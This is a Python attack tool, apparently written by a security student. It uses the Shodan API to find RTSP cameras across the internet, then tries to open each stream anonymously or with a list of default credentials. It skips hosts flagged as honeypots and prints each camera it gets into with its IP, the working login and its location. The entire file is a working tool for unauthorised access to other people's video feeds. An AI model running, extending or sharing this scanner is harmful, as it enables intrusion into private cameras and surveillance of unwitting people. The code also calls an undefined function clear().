import argparse
import threading
import cv2
import shodan
import sys
from time import sleep
from queue import Queue
from prettytable import PrettyTable

    
banner = '''
┌───────────────────────────────────────────────────────────────────────┐
│██████╗ ██╗  ██╗██████╗ ██╗  ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗│
│██╔══██╗██║  ██║██╔══██╗██║ ██╔╝██╔═████╗██╔════╝██║████╗  ██║╚══██╔══╝│
│██║  ██║███████║██████╔╝█████╔╝ ██║██╔██║███████╗██║██╔██╗ ██║   ██║   │
│██║  ██║╚════██║██╔══██╗██╔═██╗ ████╔╝██║╚════██║██║██║╚██╗██║   ██║   │
│██████╔╝     ██║██║  ██║██║  ██╗╚██████╔╝███████║██║██║ ╚████║   ██║   │
│╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   │
├────────────────────────────────────┬─────────────────┬────────────────┤
│             By C.Z3R0              │   Sec-Student   │ Version: 1.0.0 │
└────────────────────────────────────┴─────────────────┴────────────────┘

Find Vulnerable RTSP Cameras Around the World
'''


print(banner)


parser = argparse.ArgumentParser(description='Find Vulnerable RTSP Cameras Around the World')
parser.add_argument('apikey', metavar='ShodanAPIkey', type=str, help='Your Shodan API Key')
parser.add_argument('-t', metavar='Threads', type=int, help='Threads to use', default=15)

reverse = ""
args = parser.parse_args()

# Define las variables de color que se usan en las funciones de impresión
fullreset = '\033[0m'
errorcolour = '\033[91m'
successcolour = '\033[92m'
warningcolour = '\033[93m'
infocolour = '\033[94m'  # Agrega esta línea para definir la variable infocolour

def warning(message):
    print(f'[{reverse}{warningcolour}!{fullreset}] {str(message)}')

def success(message):
    print(f'[{reverse}{successcolour}!{fullreset}] {str(message)}')

def info(message):
    print(f'[{reverse}{infocolour}!{fullreset}] {str(message)}')

def error(message):
    print(f'[{reverse}{errorcolour}!{fullreset}] {str(message)}')


api = shodan.Shodan(args.apikey)

try:
    info(f'Searching...')
    results = api.search('rtsp')
    success(str(len(results['matches'])) + ' Results')
except shodan.exception.APIError as e:
    error(e)
    sys.exit()

x = PrettyTable()
x.field_names = ["IP", "Domain", "Country", "City"]

for target in results['matches']:
    targetdomain = target.get("domains", [f'{errorcolour}N/A{fullreset}'])
    if len(targetdomain) > 0:
            targetdomain = targetdomain[0]
    else:
            targetdomain = f'{errorcolour}N/A{fullreset}'
    x.add_row([target["ip_str"], targetdomain, target["location"].get("country_name", ""), target["location"].get("city", "")])

print(x)

info('Starting RTSP Probing in 5 Seconds...\n')
sleep(5)
clear()
defaultcredentials = ['admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin', 'admin:root']
badcams = []
allcams = []
print_lock = threading.Lock()

def tryrtsp(ip):
	cap = cv2.VideoCapture(f'rtsp://{ip}')
	ret, frame = cap.read()
	if ret == True:
		return 'None'
	else:
		for i in defaultcredentials:
			cap = cv2.VideoCapture(f'rtsp://{i}@{ip}')
			ret, frame = cap.read()
			if ret == True:
				return i
			else:
				pass
	return False

def rtspprobe(target):
	info(f'Probing {target["ip_str"]}...')
	if "honeypot" in str(target):
		rtspresult = False
	else:
		rtspresult = tryrtsp(target['ip_str'])
	if rtspresult != False:
		badcams.append({"ip":target["ip_str"], "country":target["location"]["country_name"], "city":target["location"]["city"], "pass":str(rtspresult)})
	else:
		pass
	allcams.append({"ip":target["ip_str"], "country":target["location"]["country_name"], "city":target["location"]["city"], "pass":str(rtspresult)})
	clear()
	print(banner)
	info('Probing RTSP Cameras... be patient!')
	if len(badcams) < 1:
		pass
	else:
		for c in badcams:
			success(f'Vulnerable RTSP Camera: {c["ip"]}, {c["pass"]}')
	print(f'\nProbed {reverse}' + str(len(allcams)) + '/' + str(len(results['matches'])) + f'{fullreset} Cameras')
def threader():

	while True:
		worker = q.get()
		rtspprobe(worker)
		q.task_done()
q = Queue()
for a in range(args.t):
	t = threading.Thread(target=threader)
	t.daemon = True
	t.start()
for worker in results['matches']:
	q.put(worker)
q.join()
		
print('\n\n')
x = PrettyTable()	
x.field_names = ["IP", "Authentication", "Country", "City"]
for badcam in badcams:
	x.add_row([badcam["ip"], badcam["pass"], badcam["country"], badcam["city"]])
clear()
print(banner)
info('Final Results:')
print(x)
